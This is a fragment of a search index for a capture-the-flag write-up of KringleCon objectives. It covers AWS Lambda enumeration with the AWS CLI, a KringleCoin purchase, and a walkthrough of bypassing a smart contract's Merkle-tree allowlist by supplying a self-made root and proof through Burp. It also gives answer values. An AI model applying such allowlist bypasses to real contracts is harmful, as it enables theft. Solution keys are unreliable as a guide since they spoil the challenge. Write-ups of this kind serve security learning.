\"7e198c3c-d4ea-48dd-9370-e5238e9ce06e\", \"FileSystemConfigs\": [ { \"Arn\": \"arn:aws:elasticfilesystem:us-east-1:602123424321:access-point/fsap- db3277b03c6e975d2\", \"LocalMountPath\": \"/mnt/smogmachine_files\" } ], \"PackageType\": \"Zip\", \"Architectures\": [ \"x86_64\" ], \"EphemeralStorage\": { \"Size\": 512 } } ] } 14.- Lambda functions can have public URLs from which they are directly accessible. Use the AWS CLI to get the configuration containing the public URL of the Lambda function. The aws lambda command to get the function URL config can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/index.html elf@ef250a6290e8:~/aws_scripts$ aws lambda get-function-url-config --function-name smogmachine_lambda { \"FunctionUrl\": \"https://rxgnav37qmvqxtaksslw5vwwjm0suhwc.lambda-url.us-east-1.on.aws/\", \"FunctionArn\": \"arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda\", \"AuthType\": \"AWS_IAM\", \"Cors\": { \"AllowCredentials\": false, \"AllowHeaders\": [], \"AllowMethods\": [ \"GET\", \"POST\" ], \"AllowOrigins\": [ \"*\" ], \"ExposeHeaders\": [], \"MaxAge\": 0 }, \"CreationTime\": \"2022-09-07T19:28:23.808713Z\", \"LastModifiedTime\": \"2022-09-07T19:28:23.808713Z\" } elf@ef250a6290e8:~/aws_scripts$ Locate the arg FunctionName $ aws lambda list-functions | grep FunctionName \"FunctionName\": \"smogmachine_lambda\",","title":"Terminal answers"},{"location":"Objectives/5_Recover_the_Burning_Ring_of_Fire/5.1_Buy_a_Hat.html","text":"Recover the Burning Ring of Fire 5.1 Buy a Hat Travel to the Burning Ring of Fire and purchase a hat from the vending machine with KringleCoin. Find hints for this objective hidden throughout the tunnels. Hint(s) Solve 1. Find the vending machine on Destinations menu \"Burning Ring of Fire\" 2. Remember to use the wallet ID that was created on challenge \"KringleCon Orientation 0.3 Create a wallet\" 3. Do \"click\" on vending machine anc choose your hat \"View our Inventory\", save the wallet address ID , Hat ID and the amount 10 KC (kringleCoins), close the window. 4. See beside a KTM machine and do \"click\" on \"Approve a KringleCoin tranfer\", fillout with the wallet address, umount and use your key created on \"KringleCon Orientation 0.3 Create a wallet\". 5. Do \"click\" Approve Transfer see the message \"Success approved\" , close the window. 6. Back to vending machine and do \"click\" on section \"Approved a transaction? know your HatID? click here to buy\" 7. Fillout with your wallet ID created on challenge \"KringleCon Orientation 0.3 Create a wallet\" and number of \"Hat ID\" saved on step 3. 8. Do click on Make your purchase! see the message \"Transaction succeeed\" 9. Verify your new hat doing \"click\" on Hat icon","title":"5.1 Buy a Hat"},{"location":"Objectives/5_Recover_the_Burning_Ring_of_Fire/5.1_Buy_a_Hat.html#recover-the-burning-ring-of-fire","text":"","title":"Recover the Burning Ring of Fire"},{"location":"Objectives/5_Recover_the_Burning_Ring_of_Fire/5.1_Buy_a_Hat.html#51-buy-a-hat","text":"Travel to the Burning Ring of Fire and purchase a hat from the vending machine with KringleCoin. Find hints for this objective hidden throughout the tunnels.","title":"5.1 Buy a Hat"},{"location":"Objectives/5_Recover_the_Burning_Ring_of_Fire/5.1_Buy_a_Hat.html#hints","text":"","title":"Hint(s)"},{"location":"Objectives/5_Recover_the_Burning_Ring_of_Fire/5.1_Buy_a_Hat.html#solve","text":"1. Find the vending machine on Destinations menu \"Burning Ring of Fire\" 2. Remember to use the wallet ID that was created on challenge \"KringleCon Orientation 0.3 Create a wallet\" 3. Do \"click\" on vending machine anc choose your hat \"View our Inventory\", save the wallet address ID , Hat ID and the amount 10 KC (kringleCoins), close the window. 4. See beside a KTM machine and do \"click\" on \"Approve a KringleCoin tranfer\", fillout with the wallet address, umount and use your key created on \"KringleCon Orientation 0.3 Create a wallet\". 5. Do \"click\" Approve Transfer see the message \"Success approved\" , close the window. 6. Back to vending machine and do \"click\" on section \"Approved a transaction? know your HatID? click here to buy\" 7. Fillout with your wallet ID created on challenge \"KringleCon Orientation 0.3 Create a wallet\" and number of \"Hat ID\" saved on step 3. 8. Do click on Make your purchase! see the message \"Transaction succeeed\" 9. Verify your new hat doing \"click\" on Hat icon","title":"Solve"},{"location":"Objectives/5_Recover_the_Burning_Ring_of_Fire/5.2_Blockchain_Divination.html","text":"Recover the Burning Ring of Fire 5.2 Blockchain Divination Use the Blockchain Explorer in the Burning Ring of Fire to investigate the contracts and transactions on the chain. At what address is the KringleCoin smart contract deployed? Find hints for this objective hidden throughout the tunnels. Hint(s) Solve ANSWER: 0xc27A2D3DE339Ce353c0eFBa32e948a88F1C86554 Just see the transactions on green area TO:","title":"5.2 Blockchain Divination"},{"location":"Objectives/5_Recover_the_Burning_Ring_of_Fire/5.2_Blockchain_Divination.html#recover-the-burning-ring-of-fire","text":"","title":"Recover the Burning Ring of Fire"},{"location":"Objectives/5_Recover_the_Burning_Ring_of_Fire/5.2_Blockchain_Divination.html#52-blockchain-divination","text":"Use the Blockchain Explorer in the Burning Ring of Fire to investigate the contracts and transactions on the chain. At what address is the KringleCoin smart contract deployed? Find hints for this objective hidden throughout the tunnels.","title":"5.2 Blockchain Divination"},{"location":"Objectives/5_Recover_the_Burning_Ring_of_Fire/5.2_Blockchain_Divination.html#hints","text":"","title":"Hint(s)"},{"location":"Objectives/5_Recover_the_Burning_Ring_of_Fire/5.2_Blockchain_Divination.html#solve","text":"ANSWER: 0xc27A2D3DE339Ce353c0eFBa32e948a88F1C86554 Just see the transactions on green area TO:","title":"Solve"},{"location":"Objectives/5_Recover_the_Burning_Ring_of_Fire/5.3_Exploit_a_Smart_Contract.html","text":"Recover the Burning Ring of Fire 5.3 Exploit a Smart Contract Exploit flaws in a smart contract to buy yourself a Bored Sporc NFT. Find hints for this objective hidden throughout the tunnels. Hint(s) Solve ANSWER: WalletID: 0x40d9F41e7a951C301FD7eBCB31E6A96f6C61992e Root: 0x5a657105c493a1213c976c653e929218bb4a516bca307dce5861ec23fffa4e58 Proof: 0x5a657105c493a1213c976c653e929218bb4a516bca307dce5861ec23fffa4e Terminal answers 1.- See the source code of webapp and the arguments provided. Arguments to Modify: WalletID: Root: Proof: 2.- Read a bit theory for best understanding regarding the \"Merkle Trees\". https://decentralizedthoughts.github.io/2020-12-22-what-is-a-merkle-tree/ 3.- The big hint provided was through the talks \"Professor Pentabyte\", there is a docker with a python ready to be used. $ git clone https://github.com/QPetabyte/Merkle_Trees.git $ cd Merkle_Trees $ sudo docker build -t merkletrees . $ sudo docker run -it --rm --name=merkletrees merkletrees 4.- Once undertanding the \"Merkle Trees\", we can use the python code and create a basic tree with any number of \"leaf\" nodes. 5.- Read the chall in depth, we need know our \"proof\" and our own \"root\" as well, based in our own Wallet ID. 6.- Observe in depth comments of python code a lot of hints, the important piece is the array with two \"leaf\" nodes. 7.- My first attemps was extract at least eight wallets ID valids (from some other players) and see what's happends if I put my walletID, suppose I am into same blockchain of players? 8.- Wrong!, python generated a valid proof and root but is not the correct way. 9.- Reading more in depth the code, after experiments some nites with a lot of theories, finally just we need a simple proof and root from my Walley ID , right? 10.- Modify the current array only with two \"leaf\" nodes, that's means add your walletID and a \"null\" value, that could be enought to know your proof and root from my WalletID 11.- Run again the python script with the new values generated: mt_user@a59aca8cc3d9:~$ python3 merkle_tree.py Root: 0xd53bb3cb4648f394794570f7ce6d91b5f111fdc6806dffed36eacdea9e8d666a Proof: ['0x5a657105c493a1213c976c653e929218bb4a516bca307dce5861ec23fffa4e58'] mt_user@a59aca8cc3d9:~$ 12.- Now use burp to modify the arguments and send the correct data: WalletID: 0x40d9F41e7a951C301FD7eBCB31E6A96f6C61992e Root: 0x5a657105c493a1213c976c653e929218bb4a516bca307dce5861ec23fffa4e58 Proof: 0x5a657105c493a1213c976c653e929218bb4a516bca307dce5861ec23fffa4e 13.- Voila!, FLAG! see your new BoredSporc (avatar)","title":"5.3 Exploit a Smart Contract"},{"location":"Objectives/5_Recover_the_Burning_Ring_of_Fire/5.3_Exploit_a_Smart_Contract.html#recover-the-burning-ring-of-fire","text":"","title":"Recover the Burning Ring of Fire"},{"location":"Objectives/5_Recover_the_Burning_Ring_of_Fire/5.3_Exploit_a_Smart_Contract.html#53-exploit-a-smart-contract","text":"Exploit flaws in a smart contract to buy yourself a Bored Sporc NFT. Find hints for this objective hidden throughout the tunnels.","title":"5.3 Exploit a Smart Contract"},{"location":"Objectives/5_Recover_the_Burning_Ring_of_Fire/5.3_Exploit_a_Smart_Contract.html#hints","text":"","title":"Hint(s)"},{"location":"Objectives/5_Recover_the_Burning_Ring_of_Fire/5.3_Exploit_a_Smart_Contract.html#solve","text":"ANSWER: WalletID: 0x40d9F41e7a951C301FD7eBCB31E6A96f6C61992e Root: 0x5a657105c493a1213c976c653e929218bb4a516bca307dce5861ec23fffa4e58 Proof: 0x5a657105c493a1213c976c653e929218bb4a516bca307dce5861ec23fffa4e","title":"Solve"},{"location":"Objectives/5_Recover_the_Burning_Ring_of_Fire/5.3_Exploit_a_Smart_Contract.html#terminal-answers","text":"1.- See the source code of webapp and the arguments provided. Arguments to Modify: WalletID: Root: Proof: 2.- Read a bit theory for best understanding regarding the \"Merkle Trees\". https://decentralizedthoughts.github.io/2020-12-22-what-is-a-merkle-tree/ 3.- The big hint provided was through the talks \"Professor Pentabyte\", there is a docker with a python ready to be used. $ git clone https://github.com/QPetabyte/Merkle_Trees.git $ cd Merkle_Trees $ sudo docker build -t merkletrees . $ sudo docker run -it --rm --name=merkletrees merkletrees 4.- Once undertanding the \"Merkle Trees\", we can use the python code and create a basic tree with any number of \"leaf\" nodes. 5.- Read the chall in depth, we need know our \"proof\" and our own \"root\" as well, based in our own Wallet ID. 6.- Observe in depth comments of python code a lot of hints, the important piece is the array with two \"leaf\" nodes. 7.- My first attemps was extract at least eight wallets ID valids (from some other players) and see what's happends if I put my walletID, suppose I am into same blockchain of players? 8.- Wrong!, python generated a valid proof and root but is not the correct way. 9.- Reading more in depth the code, after experiments some nites with a lot of theories, finally just we need a simple proof and root from my Walley ID , right? 10.- Modify the current array only with two \"leaf\" nodes, that's means add your walletID and a \"null\" value, that could be enought to know your proof and root from my WalletID 11.- Run again the python script with the new values generated: mt_user@a59aca8cc3d9:~$ python3 merkle_tree.py Root: 0xd53bb3cb4648f394794570f7ce6d91b5f111fdc6806dffed36eacdea9e8d666a Proof: ['0x5a657105c493a1213c976c653e929218bb4a516bca307dce5861ec23fffa4e58'] mt_user@a59aca8cc3d9:~$ 12.- Now use burp to modify the arguments and send the correct data: WalletID: 0x40d9F41e7a951C301FD7eBCB31E6A96f6C61992e Root: 0x5a657105c493a1213c976c653e929218bb4a516bca307dce5861ec23fffa4e58 Proof: 0x5a657105c493a1213c976c653e929218bb4a516bca307dce5861ec23fffa4e 13.- Voila!, FLAG! see your new BoredSporc (avatar)","title":"Terminal answers"},{"location":"Objectives/6_Finale/6.1_Finale.html","text":"Finale 6.1 Finale and Roll Credits; Back to talk with Santa from and castle's port now is open. Castle Room: Roll Credits:","title":"6.1 Finale and Roll Credits"},{"location":"Objectives/6_Finale/6.1_Finale.html#finale","text":"","title":"Finale"},{"location":"Objectives/6_Finale/6.1_Finale.html#61-finale-and-roll-credits","text":"Back to talk with Santa from and castle's port now is open.","title":"6.1 Finale and Roll Credits;"},{"location":"Objectives/6_Finale/6.1_Finale.html#castle-room","text":"","title":"Castle Room:"},{"location":"Objectives/6_Finale/6.1_Finale.html#roll-credits","text":"","title":"Roll Credits:"}]}